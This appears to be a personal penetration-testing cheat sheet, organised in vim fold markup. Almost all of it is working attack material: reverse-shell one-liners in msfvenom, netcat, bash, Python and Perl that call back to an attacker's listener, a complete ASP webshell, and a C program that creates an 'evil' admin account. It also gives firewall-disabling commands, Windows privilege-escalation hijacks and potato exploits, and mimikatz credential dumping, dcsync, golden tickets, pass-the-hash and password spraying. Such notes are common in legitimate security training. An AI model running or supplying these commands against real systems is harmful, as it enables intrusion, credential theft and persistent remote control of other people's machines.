msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT EXITFUNC=thread -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -e x86/shikata_ga_nai -i 4 -f exe -o $SHELL.exe
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT EXITFUNC=thread -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -e x86/shikata_ga_nai -i 4 -f exe -o /tmp/$SHELL.exe

msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f elf -o shell.elf

#binary that executes /bin/bash
msfvenom -p linux/x86/exec CND="/bin/bash -p" -f elf -o shell.elf

#if reverse_tcp isn't working, try reverse_https...
msfvenom -p windows/x64/meterpreter/reverse_https lhost=$MY_IP lport=443 -f aspx > /tmp/Shell.aspx

#execute shell as system (if already admin)
sysinternals\psexec64.exe -accepteula -i -s $SHELL.exe

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MY_IP $MY_PORT >/tmp/f" >> $VULN_FILE 
bash -i >& /dev/tcp/$MY_IP/$MY_PORT 0>&1
/usr/local/bin/nc $MY_IP $MY_PORT -e /bin/sh

nc -lvp $MY_PORT -e /bin/bash
nc -nv $MY_IP $MY_PORT &

nc -lvp $MY_PORT
nc -nv $MY_IP $MY_PORT -e /bin/bash

python {{{
import pty
import socket
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$MY_IP",$MY_PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
}}}

perl -v
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$MY_IP:$MY_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

windows {{{
#If we are dealing with an IIS server, create our own .asp or .aspx reverse shell payload with msfvenom, and then execute it.

#Add a user on windows:
net user $username $password /add
#Add a user to the “Remote Desktop Users” group:
net localgroup "Remote Desktop Users" $username /add
#Make a user an administrator:
net localgroup administrators $username /add
#Disable Windows firewall on newer versions:
NetSh Advfirewall set allprofiles state off
#Disable windows firewall on older windows:
netsh firewall set opmode disable
}}}


spawn_tty{{{
python -c 'import pty; pty.spawn("/bin/bash")'

#may not be pretty yet...try these steps
Ctrl+Z
stty raw -echo
fg
reset
#wrong size? check a local terminal for row/col
stty size
#set remote
stty -rows $ROWS -columns $COLS

echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
#From within IRB
exec "/bin/sh"
#From within vi
:!bash
#From within vi
:set shell=/bin/bash:shell
#(From within nmap
!sh
}}}

#php..modify the following, upload, execute with "php $SHELL.php"
/usr/share/webshells/php/php-reverse-shell.php

#RDP
net localgroup administrators $USERNAME /add

asp {{{
<!--
ASP Webshell
Working on latest IIS 
Referance :- 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
http://www.w3schools.com/asp/
-->

<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %> !!!!!!!!!!!!!!ADD ANOTHER \ with the first one
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The servers port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The servers software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The servers software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>

</BODY>
</HTML>
}}}

make_and_add_user_to_admin_group{{{
#include <stdlib.h>
int main (){
int i;
i = system ("net user evil Ev!lpass /add");
i = system ("net localgroup administrators evil /add");
return 0;
}
i686-w64-mingw32-gcc adduser.c -o adduser.exe
}}}
}}}

foothold/persistence {{{
sudo iptables -I INPUT 1 -s $IP	-j ACCEPT
sudo iptables -I OUTPUT 1 -d $IP -j ACCEPT
sudo iptables -Z



}}}

enumeration_and_privesc {{{
notes {{{
1. quick auto (look over everything and take notes)
2. look at interesting files
3. easy exploits first
4. admin processes - search versions for exploits
5. internal ports


#Check OS versions, patching levels
#-misconfigured services
#-insufficient file permission restrictions on binaries/services
#-direct kernel vulnerabilitie
#-vulnerable software running with high privileges
#-sensitive information stored on local files
#-registry settings that always elevate privileges before executing a binary
#-installation scripts that may contain hard coded credentials
#UAC bypass techniques and leverage kernel driver vulnerabilities,insecure file permissions, and unquoted service paths to escalate
}}}

win {{{

auto {{{ 
winpeas {{{
#udemy (course version pre-20200306)
#https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
#pre-compiled: https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe
#based on seatbelt

#run to add cmd colors (restart cmd after adding). if in reverse shell, use notcolor parameter
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

#avoid time-cosuming searches
winPEASany_20211005.exe quiet log=$TGT_IP_winpeas.txt
#specific check
winPEASany_20211005.exe quiet systeminfo
winPEASany_20211005.exe quiet userinfo
winPEASany_20211005.exe quiet servicesinfo

old_pre-20200306{{{
#run to add cmd colors (restart cmd after adding).  if in reverse shell, use notansi parameter
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

#avoid time-cosuming searches
winPEASany.exe quiet cmd searchfast fast
#specific check
winPEASany.exe quiet cmd $CHECK
winPEASany.exe quiet systeminfo
winPEASany.exe quiet userinfo
winPEASany.exe quiet servicesinfo
}}}

}}}
windows-privesc-check2.exe --dump -G
watson {{{
# This is built into winpeas now. This superseads Sherlock
# v0.1: 2790 (2x3, 2x3 r2, xp), 6000 (visa), 
#      6001 (2k8), 6002 (2k8 sp2, visa sp2),
#      7600 (2k8 r2, 7), 9200 (2k12 r2, 8.1),
#      9600 (2k12 r2, 8.1), and some windows 10.
#      https://github.com/rasta-mouse/Watson/tree/efb7cfa547492e7b631cacc0db18bb0cfd2de3bd
#      precompiled: https://github.com/carlospolop/winPE/tree/master/binaries/watson
# v2.0: Windows 10 1507, 1511, 1607, 1703, 1709,
#      1803, 1809, 1903, 1909, 2004. Server 2016 & 2019
#      https://github.com/rasta-mouse/Watson
#	   I had to replace line 25 in program.cs with the following for it to compile: 
#        var version = "Unknown";
#        if (supportedVersions.ContainsKey(buildNumber)) {
#            version = supportedVersions[buildNumber];   }
#grab .NET version & system arch.
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\NET Framework Setup\NDP"

#compile watson within VS (change target framework to be the right .NET & platform under build)
#ctrl+shift+b to build
watson.exe > $TGT_IP_watson.txt
}}}

wes {{{
#udemy - windows exploit suggester
#https://github.com/bitsadmin/wesng/

#always run
./wes.py --update

systeminfo.exe > $TGT_IP_systeminfo.txt
systeminfo.exe /S $TGT_IP > $TGT_IP_systeminfo.txt
./wes.py $TGT_IP_systeminfo.txt
./wes.py $TGT_IP_systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less

#As the data provided by Microsoft's MSRC feed is frequently incomplete and false positives are reported by wes.py, @DominicBreuker contributed the --muc-lookup parameter to validate identified missing patches against Microsoft's Update Catalog. Additionally, make sure to check https://github.com/bitsadmin/wesng/wiki/Eliminating-false-positives to interpret the results. For an overview of all available parameters, check https://github.com/bitsadmin/wesng/blob/master/CMDLINE.md

}}}
powerup {{{
#udemy/oscp
#common Windows privilege escalation vectors that rely on misconfigurations.
#has auto exploit functions. be careful! need to look into.
original: https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
powershell -ex bypass
. .\powerup.ps1
invoke-allchecks > $TGT_IP_powerup.txt
}}}
sharpup (compiled c# powerup) {{{
#udemy
#common Windows privilege escalation vectors that rely on misconfigurations.
#https://github.com/GhostPack/SharpUp
#pre-compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe

SharpUp_20180725.exe
SharpUp_20210915.exe audit
}}}
seatbelt {{{
#udemy
#It does not actively hunt for privilege escalation misconfigurations, but provides related information for further investigation.
#https://github.com/GhostPack/Seatbelt
#pre-compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
#https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt

#filters unimportant
Seatbelt_20211005.exe -group=all > $TGT_IP_seatbelt_all.txt
Seatbelt_20180725 all  > $TGT_IP_seatbelt_old_all.txt
#dont filter..grab it all!!!
Seatbelt_20211005.exe -group=all -full > $TGT_IP_seatbelt_all_full.txt
Seatbelt_20180725 all full > $TGT_IP_seatbelt_old_all_full.txt

#specific enum
seatbelt.exe NonstandardProcesses > $TGT_IP_seatbelt_procs.txt
#can chain
seatbelt.exe $CHECK $CHECK
}}}
BeRoot {{{
#https://github.com/AlessandroZ/BeRoot/tree/master/Windows
#great guide
beRoot101.exe
#list software installed
beRoot101.exe -l
}}}
LaZagne {{{
#https://github.com/AlessandroZ/LaZagne
#retrieve lots of passwords stored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.)
lazagne243.exe all
}}}
}}}

manual_enum {{{
hostname
systeminfo > $TGT_IP_systeminfo.txt
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

whoami
whoami /groups
net user
#note groups
net user $USER
net user /domain
net user $USER /domain
net group /domain

active_directory (AD) {{{
#goal to gain access to the domain admins group or the domain controller
prep {{{
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher($SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry($SearchString)
$Searcher.SearchRoot = $objDomain
}}}
domain_services_and_ips {{{
#make sure you are on a domain account
powershell -ex bypass
import-module .\getspn.ps1
Get-SPN -type service -search "*" -List yes | Format-Table -AutoSize

#manual
{{{
$Searcher.filter="serviceprincipalname=*.com*"
$service = $Searcher.FindAll()
foreach($obj in $service) {
	foreach($prop in $obj.properties){
			$domains += [regex]::Matches($prop.serviceprincipalname, '([a-zA-Z0-9\.-]+)\.[a-zA-Z0-9\.-]+').value
	}
}
foreach ($domain in $domains | sort-object | get-unique) {
	$domain
	try {[System.Net.Dns]::GetHostAddresses($domain).IPAddressToString}
	catch {"Not found"}
	""
}
}}}

}}}
users {{{
$Searcher.filter="(samAccountType=805306368)"
$Users = $Searcher.FindAll()
$Admins = $Users | ? {$_.properties.memberof -like "*Domain Admin*"}
}}}
computers {{{
$Searcher.filter="(samAccountType=805306369)"
$Computers = $Searcher.FindAll()
$Windows10 = $Computers | ? {$_.properties.operatingsystem -like "*Windows 10*"}
}}}
users_logged-on_and_sessions {{{
#https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

powershell -ex bypass
. .\PowerView.ps1
Get-NetLoggedon -ComputerName $HOSTNAME
Get-NetSession -ComputerName $HOSTNAME
}}}
groups {{{
$MAX_DEPTH = 10
function Enumerate-Group ($group_name, $depth){
	$Searcher.filter="(name=" + $group_name + ")"
	$Groups = $Searcher.FindAll()
	Foreach($obj in $Groups){ 
		"$('    ' * $depth)$($obj.properties.name)"
		if ($obj.properties.member -AND $depth -lt $MAX_DEPTH) {
			Foreach($group in $obj.Properties.member){
				Enumerate-Group ($group.substring(3) -split ',')[0] ($depth+1)
			}
		}
	}
}
$Searcher.filter="(objectClass=Group)"
$Groups = $Searcher.FindAll()
Foreach($obj in $Groups){ Enumerate-Group $obj.properties.name 0} 
}}}
}}}
#wtf, why so many ntlm and kerberos details? 
}}}

tasklist /svc
#eye-scan of all services, note things that standout...like c:\program files\.
Get-WmiObject win32_service | Select-Object Name, State, PathName

#List all scheduled tasks your user can see
schtasks /query /fo LIST /v
#or powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn

accesschk {{{
#if rdp access use accesschk64.exe (will get eula prompt), else use x86 "accesschk.ex /accepteula"
#check user/group accesses to files/directories/services/regkeys
accesschk64.exe -uws "Everyone" "C:\Program Files"
accesschk.exe /accepteula -uws "Everyone" "C:\Program Files"
}}}
powershell Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

mountvol

#drivers
powershell driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
powershell Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
driverquery /v
type C:\Progam Files\$DRIVER_PROGRAM\$DRIVER_PROGRAM.inf

reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

ipconfig /all
route print
netstat -ano
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
#turn off firewall rules?
netsh advfirewall set allprofiles state off
type c:\windows\system32\drivers\etc\hosts
}}}

#if in administrators group, get admin prompt
powershell.exe Start-Process cmd.exe -Verb runAs

kernel {{{
#even though driver is stopped, may be able to interact with it, b/c it's loaded in the kernel memory space
#use output from driver enumeration

#precompiled kernel exploits in addition to those provided by watson
https://github.com/SecWiki/windows-kernel-exploits
#EXPLOIT.exe $SHELL.exe
}}}

services {{{
#insecure properties, unqouted path, weak reg perms, insecure executable, dll hijacking
#be sure you can stop/stop before changing. or if its auto and you can reboot

winPEASany.exe quiet cmd servicesinfo

#svc config and state (powershell)
#service_start_name = localsystem means starts as system user
wmic service where (name="$SERVICE" OR caption="$SERVICE") get name, caption, state, startmode, startname, pathname
#svc config alt cmd (demand_start = manual)
sc qc $SERVICE
#svc state alt cmd
sc query $SERVICE

#need either stop/start ability, or auto and you can reboot
#check abilities (change_config, start, stop).
.\accesschk.exe /accepteula -uwcqv user $SERVICE
#or if in admin group (check with "net user $USER")
.\accesschk.exe /accepteula -uwcqv $SERVICE
#if no start/stop, but demand_start=auto. can you reboot? SeShutdownPrivilege (ignore "disabled")
whoami /priv

#if change_config ability, change binpath
sc config $SERVICE binpath= "\"$SHELL.exe\""
#or weak file perms on service binary
bad_file_uac {{{
#look for F or W for builtin\users, bultin\adminstrators, everyone, etc
icacls "$SERVICE_PATH"
#or
.\accesschk.exe /accepteula -uwqv "$SERVICE_PATH"

move /Y "$SERVICE" "$SERVICE.bak"
copy /Y $SHELL.exe "$SERVICE"
}}}
#or if space in path with no quotes, test for weak dir perms
find_unquoted_path_vuln {{{
#eg. C:\Program Files\Some Program\Service.exe
#add
#C:\Program Files\Some.exe

#build out path looking to see if builtin\users, bultin\adminstrators, everyone, etc can write/has full acess
.\accesschk.exe /accepteula -uwdq C:
.\accesschk.exe /accepteula -uwdq "C:\Program Files"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\SomeProgram"
copy $SHELL.exe "$WRITEABLE_PATH\$PATH_WITH_SPACE.exe"
}}}
#or check for weak registry
registry {{{
powershell -ex bypass
#NT AUTHORITY\INTERACTIVE FullControl
get-acl HKLM:\System\CurrentControlSet\Services\$SERVICE | Format-List
#or alt check
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\$SERVICE

#confirm path field (and objectname = localsystem)
reg query HKLM\System\CurrentControlSet\Services\$SERVICE
#change path to $SHELL
reg add HKLM\System\CurrentControlSet\Services\$SERVICE /v ImagePath /t REG_EXPAND_SZ /d $SHELL /f
}}}
#or see if service looks in writeable dir for file that isn't there
dll_inject {{{
#DLL Hijacking labeled in winpeas. Ie. Writable directory in PATH=

net stop $SERVICE
#run sysinternals procmon with admin privs
#deselect "registry" and "network" activity buttons under menubar.
#filter "process name" "is" "$SERVICE.exe" found in $SERVICE_PATH
#filter "result" "contains" "name not found"
net start $SERVICE
#look for the directories listed in winpeas

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MY_IP LPORT=53 dll -o $SHELL.dll
copy $SHELL.dll $WRITEABLE_PATH\ 
}}}

#restart/start service
net stop $SERVICE
net start $SERVICE
#or reboot
shutdown /r /t 0

#confirm privs
whoami
}}}

autoruns {{{
#may not work on win10 b/c exploit executes with privs of last logged on user

#autoruns with writeable fileperms
.\winpeasany.exe quiet applicationsinfo
#manual
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
.\accesschk.exe /accepteula -wvu "$PROGRAM"

copy "$PROGRAM" c:\temp
copy /y $SHELL "$PROGRAM"
shutdown /r /t 0
}}}

startup_apps {{{
.\accesschk.exe /accepteula -wd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

#vbscript to create shortcut files (.lnk)
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "$SHELL"
oLink.Save

#run vbs script
cscript create_shortcut.vbs

#logout and login
#or
shutdown /r /t 0
}}}

MSI_alwaysinstallelevated {{{
#AlwaysInstallElevated set to 1 in HKLM & HKCU
.\winpeasany.exe quiet windowscreds
#manual. both must be 0x1 (enabled)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MY_IP LPORT=53 -f msi -o $SHELL.msi
msi /quiet /qn /i $SHELL.msi
}}}

app_autoelevate {{{
#similar to services->dll_inject, but with normal process
#look for autoelevate
sysinternals sigcheck.exe -a -m $PROGRAM
#once autoelevate found, use procmon to find failed regkey that's writeable.
win10 1709 - fodhelper.exe {{{
sysinternals sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
C:\Windows\System32\fodhelper.exe
}}}
}}}

passwords {{{
registry {{{
.\winPEASany.exe quiet filesinfo userinfo

#manual search. yikes! lots of false positives
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
}}}
saved_creds {{{
.\winPEASany.exe quiet cmd windowscreds
#manual
cmdkey /list

runas /savecred /user:$USERNAME $SHELL
}}}
configs/unattend {{{
winpeasany.exe quiet cmd searchfast filesinfo

#manual in select dirs
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt

#unattend.xml is base64 encoded
echo "$BASE64" | base64 -d
}}}
cached_creds {{{
#view kerberos tickets for current user
klist
force_svc_ticket_to_any_service {{{
#need USER logged-on through domain. note the "end time"
#if SPN target is known, request service ticket from DC, extract from memory, save to disk
#load tokens namespace
Add-Type -AssemblyName System.IdentityModel

#request service ticket for SPN from DC
#see enumeration->win->manual->ad->domain_services_and_ips (get-spn) to get SPNs
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'DNS/DC01.corp.com'

#
net use //$SUB_DOMAIN
}}}

#need local admin prompt for logonpasswords and tickets in mimikatz
#If you are using "Invoke-mimikatz" and running directly form memory, you will need to pass the command you want directly from the source code as "Invoke-Mimikatz". You will need to use the escape character (tac) on each internal quotation mark to have a space between "kerberos::list" and "\export" Example: `"kerberos::list /export`"
.\mimikatz.exe
log $TGT_IP_mimikatz.txt
#engage SeDebugPrivilege
privilege::debug
#dump creds of all logged-on users (NTLM)
sekurlsa::logonpasswords /export
#Kerberos TGT and TGS tickets in LSASS
#TGT - can only be use on machine/user it was created for, but can request a TGS
#TGS - can only access particular resource associated, but can be exported to other machines
#in other words
sekurlsa::tickets /export
#current user's TGT and TGS tickets
#doesnt require admin
kerberos::list /export
#ctrl+f ".kerbi export"
}}}
(over)pass_the_hash {{{
#only works for servers and services using NTLM authentication, not Kerberos
#used by psexec, metasploit, passing-the-hash toolkit, impacket
#typically SMB connection through firewall and "windows file and print sharing" enabled. requires local admin rights because it uses the Admin$ share.

#on kali, use hash found in cached_creds section above
pth-winexe -U $DOMAIN/$USER%aad3b435b51404eeaad3b435b51404ee:$NTLM_HASH //$TARGET_IP cmd
#if admin
pth-winexe --system -U $DOMAIN/$USER%aad3b435b51404eeaad3b435b51404ee:$NTLM_HASH //$TARGET_IP cmd

#doesnt need admin(priv::debug), but needs GUI
.\mimikatz
#this powershell will show previous user under whoami and will succeed with bad hash. be 100% sure you have right hash or else the system will reboot when requesting TGT ticket
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NTLM_HASH /run:PowerShell.exe

#in newly created ps
#if you have the user's password, this is as simple as rdesktoping as them through domain. then "net use \\$SHARE". no need to use mimikatz
.\PsExec.exe \\$DOMAIN cmd.exe
}}}
pass_the_ticket {{{
#get TGS for user, but also be in groups the service account has on the server if the service is registered with a service principal name?
#page 662-663 in pwk pdf. possibly worth diving into more

#get_sid of user
whoami /user
#flush existing tickets
kerberos::purge

kerberos::golden /user:offsec /domain:corp.com /sid:$USER_SID_NO_RID /target:$FQDN /service:$SERVICE /rc4:$SERVICE_HASH /ptt
#kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

}}}
golden_ticket {{{
#krbtgt hash to create golden ticket (self-made TGTs)
#the secret key that the KDC uses to encrypt a user submitted TGT is the pw hash of the domain user acct krbtgt
#krbtgt password is not automatically changed. only changed when domain functional level (dictates capes of domain & determines what win OSs can be run in the domain) is upgraded from 03 to 08.
#may be: fc274a94b36874d2560a7bd332604fab

#on DC via domain account in admin group
.\mimikatz
privilege::debug
#get the krbtgt hash
lsadump::lsa /patch
#also grab sid of domain user
whoami /user

#on any windows box
#purge
kerberos::purge
#inject ticket into memory with krbtgt hash and any username (DC trusts anything encrypted with krbtgt hash)
kerberos::golden /user:$NEW_USERNAME /domain:$DOMAIN /sid:$DOMAIN_USER_SID_NO_RID /krbtgt:$KRBTGT_HASH /ptt
#group ID will consist of most privileged groups in AD
#USER ID = 500 = RID of built-in domain admin

#eg:kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt

#as long as its the only ticket, should be able to psexec from normal prompt now
psexec.exe \\$HOSTNAME cmd.exe
}}}
dcsync {{{
#Directory Replication Service Remote Protocol uses replication to synchronize these redundant domain controllers. update request for object with the IDL_DRSGetNCChanges API
#DC receiving request doesnt verify if request came from another DC, only if SID has right privs (Domain admin group)

#example as user in domain admin group
.\mimikatz
#to start the replication
#user = user to sync
#dump contains hashes associated w/last 29 used user passwords as well as the hashes used with AES encryption.
lsadump::dcsync /user:Administrator

#now request replication update from DC to obtain pw hashes of AD account?

}}}
mimikatz {{{
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
}}}
#pwdump
fgdump{{{
http://foofus.net/goons/fizzgig/fgdump/downloads.htm
}}}
wce{{{
https://www.ampliasecurity.com/research/windows-credentials-editor/
}}}
sam_backups {{{
#backups SAM/SYSTEM hives (actual hives locked while system running) may exist in:
dir C:\Windows\Repair
dir C:\Windows\System32\config\RegBack

#pullback (eg. see "smb_impacket" ... copy c::\Windows\Repair\SAM \\$MY_IP\share\)

#installed creddump7 apt in setup
python2 /usr/share/creddump7/pwdump.py SYSTEM SAM
#dump of local password hashes...
hashcat -m 1000 --force $NTLM_HASH 
}}}
NTDS.dt {{{
#copy of all Active Directory accounts stored on the hard drive, similar to the SAM database for local accounts
}}}
brute_force{{{
#requires spray-passwords.ps1

powershell -ex bypass
#check lockout threshold and observation window
net accounts
#passwod list check against all accounts (see passwords->creating_wordlists)
#-admin tests all admin accounts in addition
.\Spray-Passwords.ps1 -Pass $PASSWORDS.txt -Admin
#single passwod check against all accounts
.\Spray-Passwords.ps1 -Pass $PASSWORD -Admin

#manual 
{{{
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
}}}
}}}
#see passwords->cracking_hashes
}}}

scheduled_tasks {{{
#see enumeration->windows->manual
#investigate these files and check their perms
.\accesschk.exe /accepteula -quvw user $FILE

#if writeable...
copy $FILE c:\Temp\
echo $SHELL >> $FILE
}}}

vuln_apps {{{
seatbelt.exe NonstandardProcesses
#or (notice process is mispelled
.\winPEASany.exe quiet procesinfo

#https://exploit-db.com/?type=local&platform=windows
}}}

hot_potato {{{
# win 7, 8, early 10
# https://foxglovesecurity.com/2016/01/16/hot-potato/
# spoofing attack with NTLM relay attack
#1. sets up NBNS spoofer
#2. exhausts all udp src ports so dns lookups fail
#3. sets up HTTP EDP server to intercept redirected requests for windows updates
#4. when intercepted, tricks windows into authenticating as system user
#5. then relays creds to smb to trigger the command (reverse shell)

# on $MY_IP
nc -nvlp 53
# on win7
.\potato.exe -ip $MY_IP -cmd "cmd.exe /c " -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
}}}

#probably start with printSpoofer and work up to rotten_potato
rotten_potato {{{
#just use juicy if you can...more options
# service accounts intercept local SYSTEM tickets and then impersonate the SYSTEM user
# service accounts generally configured with SeImpersonate & SeAssignPrimaryToken
whoami /priv
SeImpersonatePrivilege enabled
}}}
juicy_potato {{{
# expanded rotten potato
# https://github.com/ohpe/juicy-potato
# fixed on latest versions of windows 10/server19
# need admin account to run psexec
# can skip psexec if user has SeImpersonate & SeAssignPrimaryToken
whoami /priv

# create listener
nc -nlvp $PORT
# use psexec to impersonate local service acct
psexec -accepteula -i -u "nt authority\local service" $SHELL.exe
# get a list of available CLSIDs
https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1
# compare to appropriate list to find usuable CLSID: 
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
# create another listener
nc -nlvp $PORT
# run exploit for system ($SHELL can be just a bat that runs nc..echo $PATH\TO\nc.exe -e cmd.exe $MY_IP $MY_PORT > bad.bat)
JuicyPotato.exe -l $RANDOM_PORT -p C:\$SHELL.exe -t * -c {$CLSID}
}}}
rogue_potato {{{
#udemy
# latest in the line of potatoes
# details: https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
# https://github.com/antonioCoco/RoguePotato/releases
# can skip psexec if user has SeImpersonate & SeAssignPrimaryToken
whoami /priv

# need admin account to run psexec?


# create listener for callback
sudo nc -nvlp $MY_PORT
# use psexec to impersonate local service acct
psexec -accepteula -i -u "nt authority\local service" $SHELL.exe
# create another listener
nc -nlvp $PORT
# on $MY_IP capture 135 traffic and redirect to $TGT_IP:9999
sudo socat tcp-listen:135,reuseaddr,fork tcp:$TGT_IP:9999
# run exploit for system
RoguePotato.exe -r $MY_IP -l 9999 -e $SHELL
}}}
printSpoofer {{{
# like rogue potato, but uses print spooler so no need for redirection back to self, it all happens on $TGT_IP
# can skip psexec if user has SeImpersonate & SeAssignPrimaryToken
# binary: https://github.com/itm4n/PrintSpoofer
# details: https://itm4n.github.io/printspoofer-abusingimpersonate-privileges/
whoami /priv

# need elevated admin account to run psexec

# create listener for callback
sudo nc -nvlp $MY_PORT
# use psexec to impersonate local service acct
psexec -accepteula -i -u "nt authority\local service" $SHELL.exe
# create another listener
nc -nlvp $PORT
# run exploit for system
PrintSpoofer.exe -i -c $SHELL
}}}

insecure_gui_apps {{{
#"citrix method" - concept can also be used to get unprivileged cmd.exe when blocked

#look for gui program running with admin perms
tasklist /V | findstr $PROGRAM
#use file menu -> open and in the explorer window navigate to
file://c:/windows/system32/cmd.exe

#other menus may also be useful to "breakout"
}}}

DCOM_lateral_mvmt {{{
#requires local admin access
#DCOM uses RPC (tcp 135). 
#requires office. eg.
#outlook: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-anddotnettojscript/
#powerpoint:https://attactics.org/2018/02/03/lateral-movement-with-powerpoint-and-dcom/
#excel: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/

#excel walkthrough (also needs SMB (TCP 445) for file copy):
